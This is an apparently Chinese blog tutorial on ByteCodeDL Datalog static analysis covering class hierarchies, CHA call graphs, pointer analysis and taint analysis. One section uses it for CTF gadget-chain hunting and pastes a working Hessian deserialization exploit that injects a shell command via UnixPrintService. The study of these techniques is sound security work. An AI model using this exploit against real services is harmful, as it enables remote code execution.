\n结果如下：\n\n\n\n\n\n1. 实现 「Class Hierarchy」\n需要构建一个类型层次图，用于寻找某个类的子类、父类，或者用于判断两个类之间是否有继承关系\n\n\n理论部分\n\ndispatch 方法\n\n\nResolve 方法构建类继承结构\n\n\n\n\nfacts 结构\n其中 DirectSuperclass.facts 中提供了类的直接继承关系\n\n同理，DirectSuperinterface.facts 中提供了类的直接接口实现关系\n\n规则构建\n\n类继承关系的推理规则\n\n\n如果满足class x 和 y DirectSuperclass(x, y) 或者DirectSuperinterface(x, y) 那么 x , y 也一定满足 SubClass(x, y)\n还需要利用递推，判断非直接的层次关系。如果x 和 z 满足SubClass(x, z) 且 z 和 y 满足 DirectSuperclass(z, y) 或者DirectSuperinterface(z, y) 那么能够推导出 SubClass(x, y)\n\n\n.type Class &lt;: symbol // 类.decl ClassModifier(mod:symbol, class:Class) // 类的修饰符.input ClassModifier.decl ClassType(class:Class) // 是否是非接口类.input ClassType.decl InterfaceType(interface:Class) // 是否是 interface.input InterfaceType.decl DirectSuperclass(child:Class, parent:Class).input DirectSuperclass.decl DirectSuperinterface(child:Class, parent:Class).input DirectSuperinterface.decl SubClass(subclass:Class, class:Class) .output SubClass// rulesSubClass(subclass, class) :- DirectSuperclass(subclass, class).SubClass(subclass, class) :- DirectSuperinterface(subclass, class).SubClass(subclass, class) :- \t(\t\tDirectSuperclass(subclass, tmp);\t\tDirectSuperinterface(subclass, tmp)\t), \tSubClass(tmp, class).\n结果如下：\n\n\ndispatch 方法的规则解析：\n\n\n如果rclass中有实现方法method.sig == sig 且method没有被abstract修饰，则直接返回method\n如果rclass没有对应的方法实现，则需要去父类中寻找相同函数签名的方法\n\n\nDispatch(simplename, descriptor, class, method) :-    MethodInfo(method, simplename, _, class, _, descriptor, _),    !MethodModifier(&quot;abstract&quot;, method).// 对应 rule 1Dispatch(simplename, descriptor, class, method) :-    !MethodInfo(_, simplename, _, class, _, descriptor, _),    DirectSuperclass(class, superclass),    Dispatch(simplename, descriptor, superclass, method),    !MethodModifier(&quot;abstract&quot;, method).  // 对应 rule 2\n\n构建 CHA 调用图\n\n理论部分\n\n\n规则构建：\n\n定义 EntryPoint(simplename:symbol, descriptor:symbol, class:Class)为入口函数\n把能够调用到的方法加入到 Reachable(method:Method, step:number) 这里限制了调用步数\n调用关系加入到 CallGraph(insn:Insn, caller:Method, callee:Method)\n\n// 先根据Etrypoint解析出具体的method，加入ReachableReachable(method, 0) :-     EntryPoint(simplename, descriptor, class),    Dispatch(simplename, descriptor, class, method).// special callee可以直接确定，所以可以直接加入到CallGraphReachable(callee, n+1),CallGraph(insn, caller, callee) :-    // 如果caller能够调用到    Reachable(caller, n),    // 并且caller调用步数未超过最大步数    n &lt; MAXSTEP,    // 且caller 调用了 callee ，那么这些条件可以推到出callee也能访问到，且步数为n+1 调用图中caller和callee有条边    SpecialMethodInvocation(insn, _, callee, _, caller).// 同上Reachable(callee, n+1),CallGraph(insn, caller, callee) :-    Reachable(caller, n),    n &lt; MAXSTEP,    StaticMethodInvocation(insn, _, callee, caller).Reachable(callee, n+1),CallGraph(insn, caller, callee) :-    Reachable(caller, n),    n &lt; MAXSTEP,    // caller 中调用了 receiver.method() 需要根据receiver的声明类型解析    VirtualMethodInvocation(insn, _, method, receiver, caller),    // 找到method 对应的方法签名也就是simplename和descriptor    MethodInfo(method, simplename, _, _, _, descriptor, _),    // 找到receiver对应的声明类型    VarType(receiver, class),    // 找到receiver 自身及其所有的子类    SubEqClass(subeqclass, class),    // 排除被abstract修饰的类    !ClassModifier(&quot;abstract&quot;, subeqclass),    // 根据方法签名和类型解析出真正的被调函数callee    Dispatch(simplename, descriptor, subeqclass, callee).\n\n\n\ntest\n作者给出的根据 CHA 构建的调用图代码 以及 RTA构建的调用图代码\n\n编写查询测试 dl\n#define MAXSTEP 8#include &quot;cha.dl&quot;// init entrypoint EntryPoint(simplename, descriptor, class) :- \tMethodInfo(_, simplename, _, class, _, descriptor, _),\tsimplename = &quot;main&quot;, \tdescriptor = &quot;([Ljava/lang/String;)V&quot;.\n\n结果如下：\n\n\n可视化处理\n作者提供了 bash 脚本可以方便的运行 neo4j 服务，并将生成的 csv 结果导入当中\nbash importOutput2Neo4j.sh neoImportCall.sh dbnameneo4j / bytecodedl\n\n\n\n\n\n\n\n2. CHA 优化\n优化的思路实际是从 sink 点反向探索，删除掉所有不可达 sink 点的节点\n规则定制：\n\n引入新的 predicate:\nSinkReachable(method:Method, sink:Method, step:number) 表示 method 经过 step 步能调用到 sink\n根据 CallGraph(insn, caller, callee) 即可剪枝\n// 初始化 sink 到 sink 为 0SinkReachable(sink, sink, 0) :-    SinkMethod(sink).// 如果caller 调用 了 callee// 且 callee n 步到 sink// 那么能够推导出 caller n+1 步 能到 sinkSinkReachable(caller, sink, n+1) :-    n &lt; MAXSTEP,    SinkReachable(callee, sink, n),     CallGraph(_, caller, callee).\n\n进一步，寻找最短路径，这里实际是遍历的方式\nShortestPathToSink(entry, sink, n) :-    n = min step : &#123;SinkReachable(entry, sink, step)&#125;,    SinkMethod(sink),    EntryMethod(entry).\n进一步可以递推 callee 的最小路径\n// 如果caller 到 sink 最短距离 为 n// 且 calle 到 sink 的距离为 n-1// 且 caller 调用 callee// 那么可以推导出 callee 到 sink 的 最短距离为 n-1ShortestPathToSink(callee, sink, n-1) :-    n &lt; MAXSTEP + 1,    ShortestPathToSink(caller, sink, n),    SinkReachable(callee, sink, n-1),    CallGraph(_, caller, callee).\n\n使用时，通过宏定义的方式来指定优化级别\n\n\n#define CHAO 1 返回的是所有能到sink的节点\n#define CHAO 2 返回的是entry到sink最短路径上的节点\n如果没有 CHAO 宏定义 则 返回的是entry 在 MAXSTEP之内能到达的所有节点\n\n\nPS： 这里优化最短路径的目的主要在于导入图数据库当中当查询步数过大时引起时间开销的问题，因此先引入最短路径，减少节点数量和环的出现，来临时解决问题。但是这种方案一定会到只函数调用图中漏报情况出现；与之对比，tabby 在导入图数据库时用的是建立索引作优化，空间换时间\n\n\n\n\n3. CHA 应用0x1. buggyLoader 0ctf-2021-final先给出这道题的背景：环境中存在 shiro-1.2.4 的依赖，并且配置文件中给出了 AES 密钥，因此允许我们构造任意序列化数据。但是这里的限制在于，环境中关于反序列化 chain 的依赖只给了 commons-collection:3.2.1 并且加上 shiro 利用的自定义类加载机制：ClassLoader.loadClass() 无法加载数组类型的 class，断绝了绝大多数的反序列化利用类。\n加上环境不出网，无法利用 JNDI 等一系列出网服务。所以思路转变为寻找一种二次反序列化入口点，来将最终的反序列化 gadget 转移到原生 readObject() 中\n\n思路：重新找个能够造成危害的public 无参函数：可以直接执行命令/代码或者能够二次反序列化\n\n\n复现前准备\n\n抽离出 jar 包中的所有 facts \njava -jar soot-fact-generator.jar -i buggyloader.jar -lsystem --generate-jimple --allow-phantom --full -d ../example/out1\n\n\n\n规则编写\n\n寻找所有的无参数公有函数（非构造函数且所在类可序列化）\n#include &quot;logic/inputDeclaration.dl&quot;#include &quot;logic/utils.dl&quot;.decl NonParamPublicMethod(method:Method, class:Class).output NonParamPublicMethodNonParamPublicMethod(method, class) :-\tMethodInfo(method, simplename, _, class, _, _, arity), \t// public 修饰\tMethodModifier(&quot;public&quot;, method), \t// 排除构造函数\tsimplename != &quot;&lt;init&gt;&quot;, \t// 参数为 0\tarity = 0, \t// 类实现了序列化接口\tSubClass(class, &quot;java.io.Serializable&quot;). \n运行可以看到满足条件的函数大概有 10264 个\n\n\n利用 CHA 调用图，筛选出可达 sink 点的函数\n这里限制 gadget 长度在 5 步之内\n#define MAXSTEP 5#define CHAO 2#include &quot;logic/cha.dl&quot;.decl FinalMethod(method:Method, class:Class).output FinalMethod// 常见 sink 点SinkDesc(&quot;exec&quot;, &quot;java.lang.Runtime&quot;).SinkDesc(&quot;&lt;init&gt;&quot;, &quot;java.lang.ProcessBuilder&quot;).SinkDesc(&quot;start&quot;, &quot;java.lang.ProcessImpl&quot;).SinkDesc(&quot;loadClass&quot;, &quot;java.lang.ClassLoader&quot;).SinkDesc(&quot;defineClass&quot;, &quot;java.lang.ClassLoader&quot;).SinkDesc(&quot;readObject&quot;, &quot;java.io.ObjectInputStream&quot;).SinkDesc(&quot;readExternal&quot;, &quot;java.io.ObjectInputStream&quot;).// 前面的 public 方法就加入到 cha 的入口函数当中EntryMethod(method),Reachable(method, 0),FinalMethod(method, class) :-\tMethodInfo(method, simplename, _, class, _, _, arity), \t// public 修饰\tMethodModifier(&quot;public&quot;, method), \t// 排除构造函数\tsimplename != &quot;&lt;init&gt;&quot;, \t// 参数为 0\tarity = 0, \t// 类实现了序列化接口\tSubClass(class, &quot;java.io.Serializable&quot;). .output SinkMethod\n感觉也没加什么，就是配置了一下 sink 函数以及刚才的入口函数。通过 CHA 算法将调用图限制在 5 步之内\n\n图数据库查询\n筛选出两步调用的\nMATCH p=(e:entry)-[*1..2]-&gt;(s:sink) where s.method contains &quot;readObject&quot;  RETURN p\n\n这里存在数组属性的限制\n\n增加调用链到 4 步，这里直接将 entry 设置为 javax.management.remote.rmi.RMIConnector\nMATCH p=(e:entry)-[*4]-&gt;(s:sink) where s.method contains &quot;readObject&quot; and ID(e)=42247 unwind nodes(p) as n return n.method\n\n可以看到最后调用确实可以\n\n入口点用 InvokerTransformer 反射调用接上即可\nreadOjbect -&gt; ... -&gt; InvokerTransformer -&gt; RMIConnector#connect() -&gt; .. -&gt; readObject -&gt; 传统的 CC 链\n\n\n\n\n0x2. ezchain hf-ctf-2022题目背景是 Hessian 反序列化，不出网，给了基本的 Rome 依赖。无法利用传统的 Rome 反序列化配合 JNDI 注入。需要寻找新的二次反序列化或者可直接执行代码/命令的无参 getter 函数\n\n规则编写\n找 getter 方法即可，注意因为 Hessian 的 SerializerFactory#setAllowNonSerializable 方法支持反序列化未实现 Serializable 接口的实例，因此无实现接口限制\nEntryMethod(method),Reachable(method, 0),FinalMethod(method, class) :-\tMethodInfo(method, simplename, _, class, _, _, arity), \t// public 修饰\tMethodModifier(&quot;public&quot;, method), \t// getter 方法\tcontains(&quot;get&quot;, simplename), \t// 参数为 0\tarity = 0. \n\n测试\n\n生成 fact \njava -jar soot-fact-generator.jar -i /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/rt.jar -l /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/rt.jar  --generate-jimple --allow-phantom --full -d ../example/ezchain\n\n执行规则查询生成 csv\nsouffle -F ezchain/ -D . gadget.dl\n验证一下确实出了\n\n\n导入 neo4j 当中方便查询\nbash importOutput2Neo4j.sh neoImportCall.sh dbnameneo4j / bytecodedl\n\nexp 这里就直接粘一个\npublic class Main &#123;    public static void main(String[] args) throws Exception&#123;        System.out.println(&quot;HFCTF2022&quot;.hashCode());        s = &quot;:Y1\\&quot;nOJF-6A&#x27;&gt;|r-&quot;;        System.out.println(s.hashCode());        String cmd = args[0];        String path = args[1];        FileOutputStream outputStream = new FileOutputStream(path);        Hessian2Output out = new Hessian2Output(outputStream);        SerializerFactory sf = new NoWriteReplaceSerializerFactory();        sf.setAllowNonSerializable(true);        out.setSerializerFactory(sf);        Field theUnsafe = Unsafe.class.getDeclaredField(&quot;theUnsafe&quot;);        theUnsafe.setAccessible(true);        Unsafe unsafe = (Unsafe) theUnsafe.get(null);        Object unix = unsafe.allocateInstance(UnixPrintService.class);        setFieldValue(unix, &quot;printer&quot;, String.format(&quot;;bash -c &#x27;%s&#x27;;&quot;, cmd));        setFieldValue(unix, &quot;lpcStatusCom&quot;, new String[]&#123;&quot;ls&quot;, &quot;ls&quot;, &quot;ls&quot;&#125;);        ToStringBean toStringBean = new ToStringBean(Class.forName(&quot;sun.print.UnixPrintService&quot;), unix);        EqualsBean hashCodeTrigger = new EqualsBean(ToStringBean.class, toStringBean);        out.writeMapBegin(&quot;java.util.HashMap&quot;);        out.writeObject(hashCodeTrigger);        out.writeObject(&quot;value&quot;);        out.writeMapEnd();        out.close();    &#125;    public static void setFieldValue(Object obj, String field, Object value)&#123;        try&#123;            Class clazz = obj.getClass();            Field fld = clazz.getDeclaredField(field);            fld.setAccessible(true);            fld.set(obj, value);        &#125;catch (Exception e)&#123;            e.printStackTrace();        &#125;    &#125;    public static class NoWriteReplaceSerializerFactory extends SerializerFactory &#123;        /**         * &#123;@inheritDoc&#125;         *         * @see com.caucho.hessian.io.SerializerFactory#getObjectSerializer(java.lang.Class)         */        @Override        public Serializer getObjectSerializer (Class&lt;?&gt; cl ) throws HessianProtocolException &#123;            return super.getObjectSerializer(cl);        &#125;        /**         * &#123;@inheritDoc&#125;         *         * @see com.caucho.hessian.io.SerializerFactory#getSerializer(java.lang.Class)         */        @Override        public Serializer getSerializer ( Class cl ) throws HessianProtocolException &#123;            Serializer serializer = super.getSerializer(cl);            if ( serializer instanceof WriteReplaceSerializer) &#123;                return UnsafeSerializer.create(cl);            &#125;            return serializer;        &#125;    &#125;&#125;\n\n\n\n\n4. 上下文无关指针分析\n由于Java多态的特性，不能仅根据声明类型解析函数调用，需要根据变量实际运行时的类型解析，通过指针分析可以得到变量在运行时指向的对象，进而可以得到对象的类型，然后根据类型即可解析出正确的被调函数，从而得到相对准确的函数调用图\n\n\n理论部分\n\n前置知识链接：\n[1] https://ranger-nju.gitbook.io/static-program-analysis-book/ch3/pointer-analysis/03-03-pointer3-analysis-spa#rule-for-call\n[2] https://souffle-lang.github.io/components\n[3] https://github.com/BytecodeDL/ByteCodeDL/blob/pt-noctx/docs/context-insensitive-points-to.md\n算法 datalog 源码分析：\n首先建立 EDB 和 IDB\n\n\n// 表示 var 变量指向 heap 这个堆对象  .decl VarPointsTo(heap:Heap, var:Var)// 表示 baseHeap 这个对象的 field 字段 指向 heap 对象  .decl InstanceFieldPointsTo(heap:Heap, baseHeap:Heap, field:Field)// 表示静态 field 指向 heap 这个对象  .decl StaticFieldPointsTo(heap:Heap, field:Field)// 表示在 baseHeap 数组中，包含了 heap 对象  .decl ArrayIndexPointsTo(heap:Heap, baseHeap:Heap)// 表示在 insn 指令中, caller 调用了 callee  .decl CallGraph(insn:Insn, caller:Method, callee:Method)// 表示方法可以访问到  .decl Reachable(method:Method)\n根据图示可以找到 datalog 和指针分析规则对应的写法\n\n\n处理 new 语句\n// new// 如果 method 方法可访问// 且在method中，将创建好的 heap 对象赋值给了 var 变量// 那么能够推导出 var 变量指向 heap 对象VarPointsTo(heap, var) :-        Reachable(method),        AssignHeapAllocation(_, _, heap, var, method, _).\n\n处理 Assign 语句\n// assign// 如果 method 方法可访问// 且 form 变量 指向 heap 对象// 且 在method中，将 from 变量赋值给了 to 即 to=form// 那么能够推到出 to变量也指向 heap 对象    VarPointsTo(heap, to) :-         Reachable(method),        VarPointsTo(heap, from),        AssignLocal(_, _, from, to, method).\n\n处理 store 语句\n这里分成静态和实例对象的 store 情况\n实例对象 field 的 store 操作：\n// store field// 如果 method 方法可访问// 且在 method 中，将 from 存到了变量 base 的field，也就是 base.field = from// 且 from 指向 heap 对象// 且 base 指向 baseHeap 对象// 那么能够推到出 baseHeap 对象的 field 也指向 heap 对象InstanceFieldPointsTo(heap, baseHeap, field) :-        Reachable(method),        StoreInstanceField(_, _, from, base, field, method),        VarPointsTo(heap, from),        VarPointsTo(baseHeap, base).\n静态 field 的 store 操作\n// store static field// 如果 method 方法可访问// 且在 method中，将 from 存入静态 field 即 T.field = from// 且 from 指向 heap 对象// 那么可以推到出 静态 field 指向 heap 对象StaticFieldPointsTo(heap, field) :-        Reachable(method),        StoreStaticField(_, _, from, field, method),        VarPointsTo(heap, from).\n\n处理 load 语句\n同样分成静态和实例对象的 load 情况：\n实例对象 field 的 load 操作：\n// load field// 如果 method 方法可访问// 且 在 method 中，将 base 变量的 field 取出赋值给了 to 也就是 to = base.field// 且 base 指向 baseHeap 对象// 且 baseHeap 对象的 field 指向 heap 对象// 那么能够推到出 to 也指向 heap 对象VarPointsTo(heap, to) :-        Reachable(method),        LoadInstanceField(_, _, to, base, field, method),        VarPointsTo(baseHeap, base),        InstanceFieldPointsTo(heap, baseHeap, field).\n静态 field 的 load 操作\n// load staic field// 如果 method 方法可访问// 且在 method 中，将静态 field 取出赋值给了 to 即 to = T.field// 且 field 指向 heap 对象// 那么可以推导出 to 也指向 heap 对象VarPointsTo(heap, to) :-        Reachable(method),        LoadStaticField(_, _, to, field, method),        StaticFieldPointsTo(heap, field).\n\n类型转换\n本质上和赋值操作的指针分析操作一致\n// cast// 如果 method 方法可访问// 且 form 变量 指向 heap 对象// 且 在 method 中，将 from 变量类型转换后赋值给了 to 即 to = (T)from// 那么能够推到出 to 变量也指向 heap 对象VarPointsTo(heap, to) :-         Reachable(method),        AssignCast(_, _, from, to, _, method),        VarPointsTo(heap, from).\n\n数组的 load 和 store\n由于分析选择的是数组下标不敏感，所以所有元素都视为 arr field 来看待\n// load from array// 如果 method 可访问// 且 从 base 数组中取出元素到 to to = base[i]// 且 base 指向 baseHeap 数组对象// 且 baseHeap 数组对象中 包含 heap 对象// 那么 to 可能指向 heap // 这里的实现未区分取第几个索引VarPointsTo(heap, to) :-        Reachable(method),        LoadArrayIndex(_, _, to, base, method),        VarPointsTo(baseHeap, base),        ArrayIndexPointsTo(heap, baseHeap).// store into array// 如果 method 可访问// 将 from 存到 base 数组中 即 base[i] = from// from 指向 heap 对象 // base 指向 baseHeap 数组对象// 那么能推导出 baseHeap 数组对象 包含 heap 对象ArrayIndexPointsTo(heap, baseHeap) :-        Reachable(method),        StoreArrayIndex(_, _, from, base, method),        VarPointsTo(heap, from),        VarPointsTo(baseHeap, base).\n\n处理函数调用 call 部分\n首先对于 special 和 static 类的函数调用，由于 receiver type 已知，因此和 CHA 算法处理一致\n// 下面开始涉及到过程间的指针分析// 先构造调用图// Special 和 Static 和 CHA 处理方式一样，编译时callee 就确定，不需要再进行解析Reachable(callee),CallGraph(insn, caller, callee) :-         Reachable(caller),        SpecialMethodInvocation(insn, _, callee, _, caller).    Reachable(callee),CallGraph(insn, caller, callee) :-         Reachable(caller),        StaticMethodInvocation(insn, _, callee, caller).\n\n\n\n\n &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230403235833247.png&quot; alt=&quot;image-20230403235833247&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n 对于 virtual 方法调用\n\n &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404001509332.png&quot; alt=&quot;image-20230404001509332&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n // Virtual Call 需要根据 base 指向 对象 的类型 进行 dispatch// caller 要可达// 在caller 中 virtual call 了 method// 调用时 base 指向 baseHeap 对象// baseHeap 对象的类型 为 class// 根据method 解析出 被调函数的签名// 通过 函数签名 和 实际类型 解析出真正的被调函数calleeReachable(callee),CallGraph(insn, caller, callee) :-         Reachable(caller),        VirtualMethodInvocation(insn, _, method, base, caller),        VarPointsTo(baseHeap, base),        NormalHeap(baseHeap, class),        MethodInfo(method, simplename, _, _, _, descriptor, _),        Dispatch(simplename, descriptor, class, callee).\n\n 接下来传递参数 形参 =&gt; 实参\n\n &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404001732250.png&quot; alt=&quot;image-20230404001732250&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n // param// 调用图中存在调用 insn// 调用时第 n 个实际参数传的是 变量 arg// 被调函数 callee 的 第 n 个 形式参数是 param// 如果 arg 指向了 heap 对象// 那么 param 也指向 heap 对象VarPointsTo(heap, param) :-         CallGraph(insn, _, callee),        ActualParam(n, insn, arg),        FormalParam(n, callee, param),        VarPointsTo(heap, arg).\n\n 然后是返回值的传递\n\n &lt;img src=&quot;静态分析实战 之 ByteCodeDL 篇/image-20230404143728718.png&quot; alt=&quot;image-20230404143728718&quot; style=&quot;zoom:50%;&quot; /&gt;\n\n // return// 调用图中存在调用 insn// 如果 在callee中，返回语句返回的是var变量// 调用后的返回值赋值给了return变量// var 变量 指向 heap 对象// 那么 return 也指向 heap 对象VarPointsTo(heap, return) :-         CallGraph(insn, _, callee),        Return(_, _, var, callee),        AssignReturnValue(insn, return),        VarPointsTo(heap, var).\n\n 最后不要忘了 this 变量对象的传递\n\n // this// 调用图中存在调用 insn// 调用时 base 指向 heap// 那么调用时 callee 的 this 变量 也指向 heap 对象VarPointsTo(heap, this) :-         CallGraph(insn, _, callee),        (            VirtualMethodInvocation(insn, _, _, base, _);            SpecialMethodInvocation(insn, _, _, base, _)        ),        ThisVar(callee, this),        VarPointsTo(heap, base).\n  为了避免命名冲突，这里用 .comp &#123;&#125; 将上述定义的规则谓词封装成元素\n\n应用\n\n提取 facts \njava -jar soot-fact-generator.jar -i Benchmark-1.0-SNAPSHOT.jar --full -l /Library/Java/JavaVirtualMachines/jdk1.8.0_91.jdk/Contents/Home/jre/lib/rt.jar -d ../example/pt_free_test --allow-phantom --generate-jimple --facts-subset APP\n\n编写测试程序\n#include &quot;logic/inputDeclaration.dl&quot;#include &quot;logic/utils.dl&quot;#include &quot;logic/pt-noctx.dl&quot;// 实例化 component.init cipt = ContextInsensitivePt// 初始化调用图入口cipt.Reachable(method) :- \tMethodInfo(method, simplename, _, _, _, descriptor, _), \tsimplename = &quot;main&quot;, \tdescriptor = &quot;([Ljava/lang/String;)V&quot;..output cipt.VarPointsTo\n这里就是设置一下方法入口点为所有 main 函数\n\nsouffle 并输出\nsouffle -F pt_free_test/ -D . pt_con_free.dl\n\n从结果中可以看到指针分析的指向结果（格式：），例如 VirtualCallDemo1 类 main 函数中，在 0行 首先有个初始化 VirtualCallDemo2 的操作，并将堆对象赋给了 vall2 参数（这里还标记了第6行）；\n其次第 9 行的 source 变量指向了 source 字面量\n\n\n扩展\n\n\nhttps://github.com/souffle-lang/java-pts\ndoop \n\n\n\n\n\n\n5. pta/ptaint Analysis\n前置知识\n\n[1] https://racerz-fighting.github.io/2023/02/04/PTaint%20Unified%20Points-to%20and%20Taint%20Analysis%20%E7%B2%BE%E8%AF%BB/\n[2] 南大-污点分析部分\n[3] https://www.youtube.com/watch?v=IA08d-kiCy8\n\np/taint 论文的思想在于将指针分析和污点分析相统一，这里的统一并不是将污点数据在传统的抽象对象上打标记，而是作为独立的对象放入到抽象对象集中根据污点分析算法在 PFG 上传播\n\n理论部分\n\n\n\n\n\n基本上和前面实现污点分析时的代码区别不大，细节在于需要注意污点对象的生成的处理（因为污点对象本身不受类型转换的影响，但是随遇一些 SanitizationMethod 会被过滤）\n预定义谓词\n// 污点分析相关的新relation// 表示通过insn指令，创建的新的污点对象heap，包括污点源的生成，以及污点转移时的生成.decl TaintHeap(insn:Insn, heap:Heap)// 表示调用指令insn发生时，危险函数的参数指向了污点对象heap.decl Leak(insn:Insn, heap:Heap)// 表示source函数，其返回值表示污点源.decl SourceMethod(method:Method)// 表示sink函数，其第n个实际参数如果指向污点对象，则表示可能存在安全风险.decl SinkMethod(method:Method, n:number)// 表示sanitize函数，经过其处理的污点，将不再是污点，也就是说污点无法通过sanitize传播，是在实际参数向形式参数传播时阻断的.decl SanitizeMethod(method:Method)// 表示sanitize函数的形式参数.decl SanitizeMethodParam(var:Var)// 筛选出sanitize函数的形式参数SanitizeMethodParam(var) :-    FormalParam(_, method, var),    SanitizeMethod(method).// 污点转移相关的// base 是 污点 返回值也是污点.decl BaseToRetTransfer(method:Method)// 参数是污点返回也是污点.decl ArgToRetTransfer(method:Method, n:number)// 将上面两个合并成一个，或者将污点转移抽象成from变量污染了to变量.decl IsTaintedFrom(insn:Insn, from:Var, to:Var)// heap 对象 污染了 newHeap对象.decl TransferTaint(heap:Heap, newHeap:Heap)\n那么就重点看下污点对象生成的规则：第一个规则是对 source 函数的处理，其将会产生污点对象。其中 cat 函数可以枚举所有符合条件的 insn 并和字符串拼接，标识这是一个污点对象；第二个规则是判断 Sink 点\n// 污点对象的生成TaintHeap(insn, heap),VarPointsTo(heap, to) :-    SourceMethod(callee),    CallGraph(insn, _, callee),    AssignReturnValue(insn, to),    heap = cat(&quot;NewTainted::&quot;, insn).// 判断sink函数的参数是否指向污点对象Leak(insn, heap) :-    CallGraph(insn, _, callee),    SinkMethod(callee, n),    ActualParam(n, insn, arg),    VarPointsTo(heap, arg),    TaintHeap(_, heap).\n接下来是污点传播：论文中给出了 base -&gt; ret 以及 arg -&gt; ret 的两种描述规则\n// base -&gt; ret    IsTaintedFrom(insn, base, ret) :-        CallGraph(insn, _, callee),        BaseToRetTransfer(callee),        VirtualMethodInvocation(insn, _, _, base, _),        AssignReturnValue(insn, ret).// arg -&gt; ret    IsTaintedFrom(insn, arg, ret) :-        CallGraph(insn, _, callee),        ArgToRetTransfer(callee, n),        ActualParam(n, insn, arg),        AssignReturnValue(insn, ret).\n进一步，将上述两个污点传播合并为一个污点转移规则。注意这里实际做了一个后向传播的设计，即所有和 to 一样指向 oldHeap 的变量，由于 to 被污染导致指向了一个新的污点对象 newHeap ，那么根据指针传播规则，其余的变量也要同样指向 newHeap ，也就是一并污染\n来自 chatGPT 的解释：\n\n简单来说，当一个污点值作为参数流向一个变换函数时，第三个规则会在任何分配和首次赋值堆对象的点上创建一个新的污点值，只要这些对象最终会流向函数的返回变量。这样做的好处在于，可以充分利用程序中的信息，准确地跟踪污点值的流动，并将其限制在可能被利用的路径上。这种技术可以提高静态分析的精度和可靠性，从而更好地检测程序中的漏洞和安全问题。\n\n// 污点转移  // from 指向了污点对象heap  // 且from能污染to  // 那么to也是污点对象，也要指向一个污点对象  // 这里没有直接让to指向新创建的污点对象  // 而是先找到to指向的正常对象oldHeap，oldHeap第一个流向的指针var，然后让newHeap也流向指针var，即var指向newHeap  // 由于oldHeap流向var之后，通过PFG可以流到to，那么newHeap也能流到to，这样也把和var alias的指针一并污染了  TaintHeap(insn, newHeap),  TransferTaint(heap, newHeap),  VarPointsTo(newHeap, var) :-       IsTaintedFrom(insn, from, to),      VarPointsTo(heap, from),      TaintHeap(_, heap),      // 污点转移函数构建新的污点对象      newHeap = cat(&quot;TransferTaint::&quot;, insn),      VarPointsTo(oldHeap, to),      AssignHeapAllocation(_, _, oldHeap, var, _, _).\n6. Demo 复现\nBenchmark-TaintDemo3\npublic class TaintDemo3 &#123;    public static void main(String[] args) &#123;        TaintDemo3 demo = new TaintDemo3();        String name = demo.Source();        demo.test1(name);    &#125;    public void test1(String name)&#123;        String sql0= &quot;select * from user where name=&#x27;&quot; + name + &quot;&#x27;&quot;;        String sql1 = sql0;        String sql = Sanitize(sql1);        Sink(sql);    &#125;    public void Sink(String param)&#123;    &#125;    public String Sanitize(String param)&#123;        String ret = param.replace(&#x27;\\&#x27;&#x27;, &#x27;`&#x27;);        return ret;    &#125;    public String Source()&#123;        return &quot;tainted name&quot;;    &#125;&#125;\n之前已经生成过 facts 集，所以这里直接编写污点传播规则\n#include &quot;logic/ptaint.dl&quot;#include &quot;logic/inputDeclaration.dl&quot;#include &quot;logic/utils.dl&quot;.init ptaint = PTaint// 配置入口ptaint.Reachable(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: void main(java.lang.String[] args)&gt;&quot;).// 配置 sourceptaint.SourceMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: java.lang.String Source()&gt;&quot;).// 配置 sinkptaint.SinkMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: void Sink(java.lang.String)&gt;&quot;, 0).// 配置污点转移函数ptaint.BaseToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;&quot;).ptaint.BaseToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.String toString()&gt;&quot;).ptaint.ArgToRetTransfer(&quot;&lt;java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)&gt;&quot;, 0).// 配置净化函数ptaint.SanitizeMethod(&quot;&lt;com.bytecodedl.benchmark.demo.TaintDemo3: java.lang.String Sanitize(java.lang.String)&gt;&quot;).decl TaintVar(var:Var)TaintVar(var) :-\tptaint.VarPointsTo(heap, var),\tptaint.TaintHeap(_, heap)..output TaintVar.output ptaint.TaintHeap.output ptaint.TransferTaint.output ptaint.VarPointsTo\n其中一个困难点在于如何配置污点转移函数，需要用到 soot 生成的 Jimple 代码来判断\n原因在于.从源代码中我们无法得到字符串底层所进行的操作\n查看 Jimple 代码可以看到，底层实际做的是字符串的拼接操作。污点数据污染方向为：\nname#_0\t-&gt; $stack7 \t\t-&gt; $stack8 \t\t\t-&gt; sql0#_11\n\n运行\nsouffle -F pt_free_test/ -D . example1.dl\n查看结果如下\n\n\nBenchmark-TaintDemo2\npublic class TaintDemo2 &#123;    public static void main(String[] args) &#123;        TaintDemo2 demo = new TaintDemo2();        String name = demo.Source();        demo.test1(name);    &#125;    public void test1(String name)&#123;        String sql = &quot;select * from user where name=&#x27;&quot; + name + &quot;&#x27;&quot;;        sql = Sanitize(sql);        Sink(sql);    &#125;    public void Sink(String param)&#123;    &#125;    public String Sanitize(String param)&#123;        String ret = param.replace(&#x27;\\&#x27;&#x27;, &#x27;`&#x27;);        return ret;    &#125;    public String Source()&#123;        return &quot;tainted name&quot;;    &#125;&#125;\n这里与 TaintDemo3 存在区别的地方位于 test1() 方法\n这里并没有临时变量 sq0/1 而是一直用一个变量\n我们查看下 Jimple 语句：\n\n查看一下 souffle 分析出来的污点变量\n\n这里可以看到 Sink 点也被污染了，原因在于这里由于全都用的是一个变量，加上分析过程为流不敏感，导致出现在净化之前污染了 Sink 点\n解决方式：soot-fact-generator 的 --ssa 参数，可以支持流敏感分析\n加上该参数后，生成的将是 Shimple 文件，由图可以看到所有赋值语句变量名均是唯一的，即区分原本两个同名变量在不同时刻的值，以此保持流敏感\n\n验证污点结果也可以看到并未污染到 Sink 点\n\n\n\n7. [案例学习] 